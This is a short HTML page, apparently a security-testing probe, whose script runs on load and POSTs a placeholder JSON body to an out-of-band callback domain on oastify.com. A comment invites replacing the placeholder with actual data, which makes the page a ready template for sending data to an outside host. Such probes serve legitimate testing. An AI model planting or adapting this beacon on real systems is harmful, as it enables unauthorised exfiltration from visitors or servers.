<html>
  <body>
       <script>
         var xhr = new XMLHttpRequest();
var url = 'https://o8xcj6uduzxopxh3ah4w3rqzcqig65.oastify.com/confirmed';

// Set up the request
xhr.open('POST', url, true);
xhr.setRequestHeader('Content-Type', 'application/json');

// Set up the data to be sent in the request body (replace this with your actual data)
var postData = JSON.stringify({ key1: 'value1', key2: 'value2' });

// Set up event listeners to handle the response
xhr.onreadystatechange = function () {
  if (xhr.readyState === 4) {
    if (xhr.status === 200) {
      // Request was successful, handle the response
      console.log('Response:', xhr.responseText);
    } else {
      // Request failed
      console.error('Request failed with status:', xhr.status);
    }
  }
};

// Send the request with the data
xhr.send(postData);
       </script>
    </body>
</html>
